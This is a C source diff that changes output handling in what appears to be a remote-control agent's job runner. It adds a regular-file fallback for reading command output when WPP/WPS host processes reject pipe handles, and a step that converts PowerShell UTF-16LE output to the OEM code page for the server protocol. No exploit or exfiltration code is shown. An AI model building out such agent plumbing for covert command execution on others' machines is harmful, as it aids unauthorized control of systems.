@@ -34,23 +34,40 @@ void MemFreeLocal(LPVOID* buffer, DWORD bufferSize)
 //////////
 
 // ReadDataFromAnonPipe 从匿名管道读取子进程输出，并自动扩容缓冲区。
-BYTE* ReadDataFromAnonPipe(HANDLE hPipe, ULONG* bufferSize)
+BYTE* ReadDataFromAnonPipe(HANDLE hPipe, ULONG* bufferSize, BOOL regularFile)
 {
+	if (!hPipe)
+		return (BYTE*)MemAllocLocal(0);
+
     BOOL  result = FALSE;
     ULONG read = 0;
     static BYTE buf[0x2000] = { 0 };
     LPVOID buffer = MemAllocLocal(0);
     do {
         DWORD available = 0;
-        ApiWin->PeekNamedPipe(hPipe, NULL, 0x1000, NULL, &available, NULL);
-        
-        if (available > 0) {
+		BOOL  pipeHandle = regularFile ? FALSE :
+			ApiWin->PeekNamedPipe(hPipe, NULL, 0x1000, NULL, &available, NULL);
+
+		if (regularFile || (pipeHandle && available > 0)) {
             result = ApiWin->ReadFile(hPipe, buf, 0x1000, &read, NULL);
             if (read == 0)
                 break;
 
             *bufferSize += read;
 
+            buffer = MemReallocLocal(buffer, *bufferSize);
+            memcpy((BYTE*)buffer + (*bufferSize - read), buf, read);
+            memset(buf, 0, read);
+        }
+        else if (!pipeHandle) {
+            // WPP/WPS main hosts may reject inheritable pipe handles. The
+            // fallback job uses a regular file handle and command-line
+            // redirection; regular-file reads advance the same handle offset.
+            result = ApiWin->ReadFile(hPipe, buf, 0x1000, &read, NULL);
+            if (read == 0)
+                break;
+
+            *bufferSize += read;
             buffer = MemReallocLocal(buffer, *bufferSize);
             memcpy((BYTE*)buffer + (*bufferSize - read), buf, read);
             memset(buf, 0, read);
@@ -64,7 +81,57 @@ BYTE* ReadDataFromAnonPipe(HANDLE hPipe, ULONG* bufferSize)
 
     } while (result);
 
-    return (BYTE*)buffer;
+	return (BYTE*)buffer;
+}
+
+// PowerShell 5.1 在普通文件重定向时会写入 UTF-16LE BOM；服务端协议的
+// job 文本则按 agent OEM code page 解析，因此在 agent 侧完成一次转换。
+BYTE* NormalizeProcessOutput(BYTE* buffer, ULONG* bufferSize)
+{
+	if (!buffer || !bufferSize || *bufferSize < 2 ||
+		buffer[0] != 0xff || buffer[1] != 0xfe ||
+		!ApiWin || !ApiWin->WideCharToMultiByte)
+		return buffer;
+
+	ULONG wideBytes = *bufferSize - 2;
+	int wideChars = (int)(wideBytes / sizeof(WCHAR));
+	if (wideChars <= 0)
+		return buffer;
+
+	UINT codePage = ApiWin->GetOEMCP ? ApiWin->GetOEMCP() : CP_ACP;
+	int convertedSize = ApiWin->WideCharToMultiByte(
+		codePage,
+		0,
+		(LPCWCH)(buffer + 2),
+		wideChars,
+		NULL,
+		0,
+		NULL,
+		NULL);
+	if (convertedSize <= 0)
+		return buffer;
+
+	BYTE* converted = (BYTE*)MemAllocLocal((DWORD)convertedSize);
+	if (!converted)
+		return buffer;
+
+	int written = ApiWin->WideCharToMultiByte(
+		codePage,
+		0,
+		(LPCWCH)(buffer + 2),
+		wideChars,
+		(LPSTR)converted,
+		convertedSize,
+		NULL,
+		NULL);
+	if (written <= 0) {
+		MemFreeLocal((LPVOID*)&converted, (DWORD)convertedSize);
+		return buffer;
+	}
+
+	MemFreeLocal((LPVOID*)&buffer, *bufferSize);
+	*bufferSize = (ULONG)written;
+	return converted;
 }
 
 //////////
